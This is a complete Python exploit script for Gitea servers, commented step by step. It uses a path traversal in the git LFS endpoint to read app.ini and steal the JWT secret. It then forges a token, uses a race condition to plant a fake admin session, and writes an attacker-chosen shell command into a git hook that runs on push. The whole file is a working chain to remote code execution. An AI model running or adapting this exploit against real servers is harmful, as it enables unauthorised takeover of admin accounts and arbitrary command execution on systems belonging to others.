# pip install PyJWT requests
# pip install dulwich==0.19.0
from requests import Request, Session, get, post
import jwt
import time
import base64
import os
import re
import time
import threading
import random
import string
import urlparse
import urllib
from dulwich import porcelain
import sys

if len(sys.argv) < 2:
	print "usage" + sys.argv[0] + "server_address:3000 script_file"
	os.exit(0)

def decode_base64(data):
    missing_padding = len(data) % 4
    if missing_padding != 0:
        data += '='* (4 - missing_padding)
    return base64.urlsafe_b64decode(data)

def get_random():
	return ''.join(random.choice(string.lowercase) for x in range(6))

def get_csrf(path):
	# send a get request to the specified url and path
	temp = s.get("{}{}".format(url, path))

	# encode the response
	content = temp.text.encode("utf-8")

	# search the response for the csrf token using regular expression
	csrf = re.search('name="_csrf" content="([^"]+)"', content)

	if not csrf:
		print ("[-] Cannot get CSRF token")
		os._exit(0)

	return csrf.group(1)

command = open(sys.argv[2], 'rb').read()
#url = 'http://localhost:3000/'
url = sys.argv[1]
session_value = '11session'

# query the url to check if it is a gitea server
r = get('{}api/v1/repos/search?limit=1'.format(url))
try:
	out = r.json()['data']
except:
	print "[-] Probably not gitea url"
	os._exit(0)

if len(out) != 1:
	print "[-] There is no public repos"
	os._exit(0)

out = out[0]

# extract info on the public server
public_repo_id = int(out['id'])
public_user_id = int(out['owner']['id'])
public_repo_url = out['full_name']

print "[+] Found public repo {} ID {}".format(public_repo_url, public_repo_id)

json = {
	"Oid": "....gitea/conf/app.ini",
	"Size": 1000000, # This needs to be bigger than file
	"User" : "a",
	"Password" : "a",
	"Repo"  : "a",
	"Authorization" : "a"
}

s = Session()

# Create fake OID for git LFS object
r  = s.post('{}{}.git/info/lfs/objects'.format(url, public_repo_url), json=json, headers={'Accept': 'application/vnd.git-lfs+json'})
if '"Unauthorized"' not in r.text or '"expires_at"' not in r.text:
	print "[-] Cannot create fake OID for app.ini"
	os._exit(0)

print "[+] Fake OID for app.ini created"

# Use fake OID created above to pull the app.ini file
r = get(r'{}{}.git/info/lfs/'.format(url, public_repo_url))
r = get(r'{}{}.git/info/lfs/objects/....gitea%2fconf%2fapp.ini/sth'.format(url, public_repo_url))

if "RUN_USER" not in r.text:
    print "[-] Cannot get app.ini"
    os._exit(0)

# find JWT secret inside app.ini
# we can use this to create a new admin session
secret_match = re.search('LFS_JWT_SECRET *= *(.*?)[\r\n]', r.text)
if not secret_match:
	print "[-] Cannot find JWT secret in app.ini"
	os._exit(0)

jwt_secret = str(secret_match.group(1).strip())
print "[+] Found secret: {}-".format(jwt_secret)
jwt_secret = decode_base64(jwt_secret)
# This needs to be INT, not STR
yesterday = int(time.time())-(60*60*24*1000)
tomorrow = int(time.time())+(60*60*24*1000)

# create the admin token
token = jwt.encode({'user': public_user_id, 'repo': public_repo_id, 'op': 'upload', 'exp': tomorrow, 'nbf': yesterday}, jwt_secret, algorithm='HS256')

print "[+] Generate jwt token for user {} and repo {}".format(public_user_id, public_repo_id)

# use same fake OID trick as above, but this time we use it to upload fake session to the sessions folder
json['Oid'] = '....gitea/sessions/1/1/{}'.format(session_value)

r  = s.post('{}{}.git/info/lfs/objects'.format(url, public_repo_url), json=json, headers={'Accept': 'application/vnd.git-lfs+json'})
if '"Unauthorized"' not in r.text or '"expires_at"' not in r.text:
	print "[-] Cannot create fake OID for session"
	os._exit(0)

print "[+] Fake OID for session created"

# This race condition is in place to buy us as much time as possible to make use
# of our admin session. the longer this takes, the more time we have to upload a
# malicious script to the repo.
def race_condition_thread():
	print "\n[+] Race condition thread started"
	ts = Session()
	req = Request('PUT', r'{}{}.git/info/lfs/objects/....gitea%2fsessions%2f1%2f1%2f{}'.format(url, public_repo_url, session_value) , data=open('session.tmp', "rb").read())
	prepped = req.prepare()
	# We need to set explicit big content length for race condition
	prepped.headers['Content-Length'] = 150000
	prepped.headers['Accept'] = 'application/vnd.git-lfs'
	prepped.headers['Content-Type'] = 'application/vnd.git-lfs'
	prepped.headers['Authorization'] = 'Bearer {}'.format(token)
	# This will hang because of big Content-Length
	print "[+] Race thread is sending large file!"
	response = ts.send(prepped)
	print "\n[-] Race condition thread ended before exploit finish, try again"

thread = threading.Thread(target=race_condition_thread, args=())
thread.daemon = True
thread.start()

# Sleep give some time for the race thread to get started and submit the
# request.
print "\n[+] Sleep 5 seconds"
time.sleep(5)

print "[+] Try using fake cookie: {}".format(session_value)

# Connect to our newly created session.
s = Session()
s.headers.update({'Cookie': 'i_like_gitea={}.tmp;'.format(session_value)})
# test to see if we succesfully connected.
r = s.get('{}api/v1/user'.format(url))
data = r.json()

if not "id" in data or data['id'] != 1:
	print "[-] Impersonation failed"
	os._exit(0)

user_name = data['login']
user_id = data['id']

print "[+] Login as {} ID {}".format(user_name, user_id)

# Get csrf token and upload it to the server.
csrf = get_csrf('user/settings/applications')
post_token = s.post('{}user/settings/applications'.format(url), data={'_csrf':csrf, 'name':get_random()}, allow_redirects=False)

try:
	login_token = post_token.cookies['macaron_flash']
	login_token = dict(urlparse.parse_qsl(urllib.unquote(login_token)))
	login_token = login_token['info']
except:
	print "[-] Cannot create token"
	os._exit(0)

print "[+] Login token: {}".format(login_token)

csrf = get_csrf('repo/create')
admin_repo_name = get_random()

print "[+] Try create repo {}".format(admin_repo_name)

# Create a new repo, this is where we will upload files to the hooks directory.
repo_post = s.post("{}repo/create".format(url), data={'_csrf':csrf, 'uid':user_id, 'repo_name':admin_repo_name, 'readme': 'Default', 'auto_init':'on'}, allow_redirects=False)

if repo_post.status_code != 302:
	print "[-] Cannot create admin repo"
	os._exit(0)

csrf = get_csrf('{}/{}/settings/hooks/git/update'.format(user_name, admin_repo_name))

# Upload malicious script to hooks directory
hook_posts = s.post('{}{}/{}/settings/hooks/git/update'.format(url, user_name, admin_repo_name), data={'_csrf':csrf, 'content':"#!/bin/sh\n{}".format(command)}, allow_redirects=False)

if hook_posts.status_code != 302:
	print "[-] Cannot updatehook"
	os._exit(0)

clone_url = '{}{}:{}@{}{}/{}.git'.format(url[0:7], login_token, "", url[7:], user_name, admin_repo_name)

temp_repo_dir = get_random()
r = porcelain.clone(clone_url, temp_repo_dir)

# Upload random commit to repo to trigger the malicious script.
porcelain.commit(r, get_random())
porcelain.push(r, clone_url, "master")

print "\ncurrent date: "
os.system('date')
print 'link: ' + '{}{}/{}/objects/info/exploit'.format(url, user_name, admin_repo_name)
